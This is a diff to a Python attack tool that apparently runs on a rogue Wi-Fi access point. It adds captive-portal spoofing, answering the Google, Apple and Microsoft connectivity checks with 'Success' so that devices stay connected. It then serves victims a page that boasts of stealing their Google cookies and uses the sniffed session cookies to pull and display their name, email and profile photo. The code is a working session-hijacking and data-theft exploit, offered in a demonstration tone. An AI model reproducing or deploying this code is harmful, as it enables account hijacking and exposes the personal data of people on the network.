@@ -25,6 +25,8 @@ user_complete = {}	# dict to track packet status if chunked
 user_start = {}		# dict to track user packet start
 cookie_dict = {} 	# dict to store the user cookies
 img_dict =  {} 		# dict to store the pared image URL
+captive_list = ["clients3.google.com", "akamaitechnologies.com", "apple.com", "appleiphonecell.com", "itools.info", "ibook.info", "airport.us", "thinkdifferent.us", "akamaiedge.net", "msftncsi.com", "microsoft.com"]
+
 
 
 ###########################################################################################################
@@ -158,48 +160,84 @@ def run_response_server():
 
 	global cookie_dict
 	global img_dict
+	global captive_list
 
 	class Handler(BaseHTTPRequestHandler):
 
 		#Handler for the GET requests
 		def do_GET(self):
 
-			self.path = self.path.split("?")[0]
-			now = time.time()
-			timeout = now + 10
+			cur_domain = None
+			captive_page = 0
+			head_array = str(self.headers)
 			cookie_flag = 0
+			head_array = head_array.split("\r\n")
 
-			while cookie_flag == 0 :
+			for hdr in head_array:
+				if "host: " in hdr.lower():
+					cur_domain = copy.deepcopy(hdr.split(": ")[1])
+					break
 				
-				if self.client_address[0] in cookie_dict:
-
-					if self.path == "/": #send html response
-
-						name, email = make_request(self.client_address[0], cookie_dict[self.client_address[0]])
-
-						self.send_response(200)
-						self.send_header('Content-type','text/html')
-						self.end_headers()
-						
-						#make changes here to make the HTML look more facny
-						self.wfile.write("<center>"+name+"<br><br>"+email+"<br><br>"+"<img src=\"photo.jpg\" alt=\"profile_picture\" height=\"300\" width=\"300\"></center>")
-
-					elif self.path == "/photo.jpg":
-
-						image_content = grab_img (img_dict[self.client_address[0]], cookie_dict[self.client_address[0]])
-
-						self.send_response(200)
-						self.send_header('Content-type','image/jpg')
-						self.end_headers()
-						self.wfile.write(image_content)
-
-					cookie_flag = 1
-					return
-
-				if time.time() > timeout:
+			for cap_host in captive_list:
+				if cap_host in cur_domain:
+					captive_page =1
 					break
 
-			self.send_error(404,'Please try again while signed in with your google account')
+			if "/hotspot-detect.html" in str(self.path):
+				captive_page =1
+
+			if captive_page == 1:
+
+				self.send_response(200)
+				self.send_header('Content-type','text/html')
+				self.end_headers()
+				self.wfile.write("<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>")
+				return
+			
+			else:
+
+				self.path = self.path.split("?")[0]
+
+				if self.path == "/usr_cookie_attack_page.html":
+					
+					now = time.time()
+					timeout = now + 15
+
+				 	while cookie_flag == 0:
+
+						if self.client_address[0] in cookie_dict:
+
+							if self.path == "/usr_cookie_attack_page.html": #send html response
+
+								name, email = make_request(self.client_address[0], cookie_dict[self.client_address[0]])
+								self.send_response(200)
+								self.send_header('Content-type','text/html')
+								self.end_headers()
+
+								#make changes here to make the HTML look more facny
+								self.wfile.write("<center>"+name+"<br><br>"+email+"<br><br>"+"<img src=\"usr_cookie_attack_photo.jpg\" alt=\"profile_picture\" height=\"300\" width=\"300\"></center>")
+
+							cookie_flag = 1
+							return
+
+						if time.time() > timeout:
+							self.send_error(408,'Please try again while signed in with your google account')
+							return
+
+				elif self.path == "/usr_cookie_attack_photo.jpg":
+					image_content = grab_img (img_dict[self.client_address[0]], cookie_dict[self.client_address[0]])
+					self.send_response(200)
+					self.send_header('Content-type','image/jpg')
+					self.end_headers()
+					self.wfile.write(image_content)
+					return
+
+				else:
+					self.send_response(200)
+					self.send_header('Content-type','text/html')
+					self.end_headers()
+					self.wfile.write("<!DOCTYPE html><html><img src=\"http://www.google.com/poop.png\" alt=\"Google\" style=\"width:10px;height:10px;\"><h1><center>Hey! Hold on a sec, let me steal your Google cookies</center></h1><br><h2><center>You just got owned...</center></h2><br><h3><center>Please read our Terms and Agreements before you proceed</center><h3></body><center><form action=\"http://172.16.42.1:8000/usr_cookie_attack_page.html\"><input type=\"submit\" value=\"See Personal Info\"></form><center></html>")
+					return
 
 
 	class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
@@ -256,7 +294,8 @@ def packet_parser(packet):
 
 def main():
 	
-	# Run the response server in a parallel thread
+	#run_response_server()
+	#Run the response server in a parallel thread
 	server_thread = threading.Thread(target=run_response_server, args=())
 	server_thread.daemon = True   
 	server_thread.start()
